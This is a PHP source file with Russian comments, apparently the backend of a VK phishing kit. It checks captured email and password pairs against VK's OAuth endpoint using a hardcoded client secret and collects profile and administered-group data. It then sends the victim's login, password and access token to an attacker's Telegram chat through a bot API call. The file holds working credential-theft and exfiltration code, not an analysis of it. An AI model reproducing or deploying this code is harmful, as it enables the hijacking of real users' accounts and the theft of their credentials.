<?php
/**
 * Created by PhpStorm.
 * User: tw1nz
 * Date: 21.12.2019
 * Time: 19:34
 */



// Телеграм Отчет (Отсылает сообщения в телеграмм).
function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}


// Проверка на валид.
function Validation_account($email, $password){
    error_reporting (0);
    $data = json_decode(file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={$email}&password={$password}"));
    if($data->access_token == "") {
        return 'NO';
    } else {
        $token = $data->access_token;
        $user_id = $data->user_id;

        /// Функц. АПИ полетели >>>>>>>>>>>>>>>>>>
        ///
        /// получаем данные о аккаунте
        $request = file_get_contents('https://api.vk.com/method/account.getProfileInfo?access_token='.$token.'&version=5.92');
        $request = json_decode($request, TRUE);

        $first_name = $request['response']['first_name'];
        $last_name = $request['response']['last_name'];
        $sex = $request['response']['sex']; /// Пол, 1 — женский 2 — мужской; 0 — пол не указан.
        $bdate = $request['response']['bdate']; // дата рождения пользователя, возвращается в формате D.M.YYYY
        $country  = $request['response']['country']['title'];  //страна. Объект, содержащий поля: id (integer) — идентификатор страны; title (string) — название страны.
        $home_town = $request['response']['home_town']; //Родной Город

        //// получаем данные о Группах пользователя
        ///
        $request2 = file_get_contents('https://api.vk.com/method/groups.get?access_token='.$token.'&version=5.92&user_id='.$user_id.'&filter=admin');
        $request2 = json_decode($request2, TRUE);
        $count_public = $request2['response']['count']; // Кол-во администрируемых пабликов
        if (empty($count_public)) $count_public = 0;
        $first_last_name = $first_name.' '.$last_name;
        /// Генерируем сообщения
           $message = Message_create($email, $password, $token, $user_id, $first_last_name, $bdate, $country, $home_town, $count_public);
          /// Отправляем сообщения
            message_to_telegram($message);
               return 'OK';

    }


}



// Проверка на дубль
function Dublicats($files, $data){
    $file  = file($files); /// Добавляем в массив файл
    /// Обходим весь массив чтобы проверить на пробелы лишние..
    foreach ($file as $key => $val) {
        $file[$key] = trim($val);
    }

    $search  = in_array($data, $file, TRUE); /// Идем в поиск и ищем данное значения
    return $search;
}




/// Вид сообщения бота
function Message_create($login, $pass, $token, $user_id, $last_fist_name, $bdate, $country, $home_toun, $count_public){
    $message = '
👑 Данные от аккаунта: '.PHP_EOL.'
✅ Логин: '.$login.PHP_EOL.'
✅ Пароль: '.$pass.PHP_EOL.'
✅ Token: '.$token.PHP_EOL.'
✅ ID: '.$user_id.PHP_EOL.'
';
    return $message;
}